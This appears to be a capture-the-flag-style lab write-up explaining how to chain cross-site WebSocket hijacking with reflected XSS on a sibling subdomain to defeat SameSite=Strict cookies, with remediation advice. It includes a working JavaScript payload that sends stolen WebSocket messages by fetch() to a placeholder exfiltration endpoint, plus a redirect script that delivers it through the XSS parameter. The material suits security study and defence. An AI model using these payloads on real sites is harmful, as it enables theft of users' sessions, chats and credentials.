# SameSite Strict Bypass via Sibling Domain (Cross-Site WebSocket Hijacking)

**Module:** CSRF / WebSocket Security **Difficulty:** Practitioner **Category:** Cross-Site WebSocket Hijacking (CSWSH) + Reflected XSS chain

---

## Vulnerability Concept

The target app has a live chat feature running over WebSocket. On connecting, the client sends a `READY` message and the server replies by streaming back the user's **entire chat history** over the open socket.

Two separate weaknesses combine to make this exploitable:

1. **No anti-CSRF protection on the WebSocket handshake.** The `GET /chat` upgrade request carries no unpredictable, per-session token. Anything that can get a browser to issue that handshake request with a valid session cookie can hijack the connection and read the stream.
2. **The session cookie's `SameSite=Strict` attribute blocks the obvious attack**, but `SameSite` scopes to the *registrable site*, not the exact origin. A sibling subdomain (e.g. `cms-{lab-id}.web-security-academy.net` vs the main `{lab-id}.web-security-academy.net`) is a different origin but the *same site*. If attacker-controlled JavaScript can be made to execute on that sibling subdomain, requests it issues are treated as same-site, and the cookie is attached.

The sibling subdomain has its own **reflected XSS** vulnerability (unsanitized `username` parameter in a login form, reflected into an "Invalid username" error message). That XSS is the delivery mechanism: it lets attacker JS run from a same-site origin, which is the missing piece needed to defeat `SameSite=Strict` on the WebSocket hijack.

**Core lesson:** `SameSite` cookie protections defend against cross-*site* attacks, not cross-*origin-same-site* attacks. Any XSS anywhere on a sibling subdomain of the same registrable domain silently defeats SameSite cookie protections on the whole site.

---

## Exploitation Logic

The exploit chain has two stages, each confirmed independently before combining them:

**Stage 1 — Confirm the WebSocket is hijackable at all (ignoring SameSite):**

- Open a WebSocket to `/chat` from an arbitrary cross-origin page.
- Send `READY`.
- Exfiltrate whatever comes back to an attacker-controlled endpoint.
- Expected result at this stage: the hijack technically works, but the session cookie is NOT sent (blocked by `SameSite=Strict`), so you only capture a fresh/empty session's chat history — proves the mechanism, not yet useful.

**Stage 2 — Defeat SameSite using the sibling domain:**

- Find the sibling subdomain (via `Access-Control-Allow-Origin` response headers on static resources served by the main chat app).
- Confirm it has a reflected XSS point (unsanitized parameter reflected into the response).
- Convert the vulnerable request to GET so the payload can be delivered via a single URL.
- Inject the Stage 1 hijacking script, URL-encoded, into that XSS parameter.
- Redirect the victim's browser to that crafted URL. The browser renders/executes the injected script *as if it were running on the sibling subdomain* — same site as the main app, so the session cookie IS attached to the resulting WebSocket handshake.
- The real chat history (containing the victim's plaintext credentials, by lab design) gets exfiltrated to the attacker's endpoint.

---

## Script Workflow

**1. WebSocket hijack / exfiltration script** (the actual payload):

```html
<script>
var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
ws.onopen = function() {
    ws.send("READY");
};
ws.onmessage = function(event) {
    fetch('https://YOUR-EXFIL-ENDPOINT', {method: 'POST', mode: 'no-cors', body: event.data});
};
</script>
```

- `ws.onopen` fires once the handshake succeeds; sending `READY` is the app's own protocol trigger for the server to push chat history.
- `ws.onmessage` fires per incoming message; `fetch(..., {mode: 'no-cors'})` lets the exfil request fire cross-origin without needing to read its response — only the side-effect (the server receiving the data) matters.

**2. URL-encode the full script** (for embedding as a query parameter):

```javascript
encodeURIComponent(`<script>...full script above...</script>`)
```

Run in any browser DevTools console.

**3. Delivery/redirect script, hosted on the exploit server:**

```html
<script>
document.location = "https://SIBLING-DOMAIN.web-security-academy.net/login?username=ENCODED-SCRIPT&password=anything";
</script>
```

This forces the victim's browser to navigate to the sibling domain's vulnerable endpoint, triggering the reflected XSS, which executes the hijack script same-site.

**4. Verifying the chain:**

- Check the triggered `/chat` WebSocket handshake in proxy history — confirm the `Cookie` header is now present (it was absent in Stage 1).
- Confirm exfiltrated data at the collection endpoint contains real chat content, not an empty new session.

---

## Tooling Notes (Collaborator Alternative)

Burp Collaborator (Professional-only) isn't required for this attack class — any externally reachable endpoint that logs incoming requests works as the out-of-band collection point:

- **webhook.site** — free, zero-setup, unique URL per session, live-updating UI. Good default substitute for this and other OOB-exfiltration labs (blind SSRF, blind XXE, async SQLi, etc.).
- Has a public API for polling received requests programmatically — worth scripting for repeated/automated use across future labs rather than manually checking the UI each time.

---

## Why It Matters Generally

- **WebSocket handshakes are plain HTTP requests** and inherit whatever cookies the browser would send on any other request to that host — including SameSite behavior. Developers sometimes assume WebSockets are "session-less" or exempt from CSRF-style concerns; they aren't.
- **There is no CORS equivalent for WebSockets.** A server must explicitly validate the `Origin` header on the handshake if it wants to restrict which sites can open a connection — nothing blocks this by default the way CORS blocks cross-origin `fetch()` reads.
- **SameSite is a *site*-scoped defense, not an *origin*-scoped one.** Any subdomain under the same registrable domain — regardless of how separate it looks operationally (different team, different app, different purpose) — can become an attack vector against the whole site's cookies if it has any injection vulnerability.
- This is a good example of **vulnerability chaining**: neither the missing WebSocket auth nor the sibling-domain XSS is independently catastrophic, but combined they fully defeat a cookie protection that looked solid in isolation.

---

## Remediation

- **Add anti-CSRF protection to WebSocket handshakes** — a per-session, unpredictable token validated server-side before upgrading the connection (not just relying on cookie presence).
- **Validate the `Origin` header** on the WebSocket handshake server-side, allow-listing only expected origins.
- **Fix the reflected XSS** on the sibling domain — contextually encode/escape the `username` parameter before reflecting it into HTML responses.
- **Treat all subdomains of a registrable domain as part of the same trust boundary** when reasoning about SameSite cookie protections — an XSS bug on any one of them can undermine cookie-based defenses everywhere else on the domain. Where feasible, isolate genuinely separate applications onto entirely different registrable domains rather than subdomains, if independent SameSite protection is a security requirement.
